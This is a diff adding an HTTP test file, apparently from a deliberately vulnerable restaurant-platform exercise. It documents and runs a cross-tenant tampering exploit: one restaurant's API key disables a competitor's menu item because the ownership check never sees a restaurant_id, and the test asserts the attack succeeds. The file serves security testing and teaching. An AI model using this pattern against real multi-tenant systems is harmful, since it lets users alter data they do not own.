@@ -1,0 +1,62 @@
+# @import ../_imports.http
+
+# =============================================================================
+# VULNERABILITY: R03 Menu Edits Without Restaurant ID (cross-tenant tampering)
+# =============================================================================
+#
+# DESCRIPTION:
+#   The @restaurant_owns decorator checks request.view_args.get("restaurant_id")
+#   but the PATCH /menu/<item_id> route has no restaurant_id in the path.
+#   Without a restaurant_id to compare against, the decorator only verifies
+#   the item exists - not that the authenticated restaurant owns it.
+#
+# ATTACK SCENARIO:
+#   Plankton (Chum Bucket owner):
+#   1. Identifies a popular Krusty Krab menu item (Krabby Patty)
+#   2. Uses his Chum Bucket API key to call PATCH /menu/1
+#   3. Sets {"available": false} to disable the competitor's best seller
+#   4. The decorator has no restaurant_id to check, so it allows the edit
+#
+# IMPACT:
+#   Cross-tenant menu tampering. Any authenticated restaurant manager can
+#   modify ANY menu item in the platform, regardless of ownership.
+#
+# STATUS: VULNERABLE in v303 (exploit succeeds)
+#         When fixed (v304+), this test should be excluded or overridden.
+# =============================================================================
+
+# =============================================================================
+# SETUP: Seed database and identify target menu item
+# =============================================================================
+
+### Seed the database with fresh state
+# @name seed
+{{
+  await platform.seed();
+}}
+# @ucskip
+# @tag menu, r03, v303, vulnerable
+GET /menu
+
+# Find the Krabby Patty - a Krusty Krab item (restaurant_id=1)
+@krabby_patty_id = {{$(response).find(i => i.name === "Krabby Patty").id}}
+
+# =============================================================================
+# EXPLOIT: Chum Bucket manager disables Krusty Krab menu item
+# =============================================================================
+
+### Plankton uses his Chum Bucket API key to disable a Krusty Krab item
+# The @restaurant_owns decorator cannot enforce ownership because there's
+# no restaurant_id in the route path to compare against g.restaurant_id.
+# @name exploit_menu_edit
+# @forceRef seed
+# @tag menu, r03, v303, vulnerable
+PATCH /menu/{{krabby_patty_id}}
+X-API-Key: {{auth.restaurant("chum_bucket")}}
+Content-Type: application/json
+
+{ "available": false }
+
+# VULNERABLE: Exploit succeeds - wrong restaurant can edit item
+?? js $(response).isOk() == true
+?? js $(response).field("available") == false
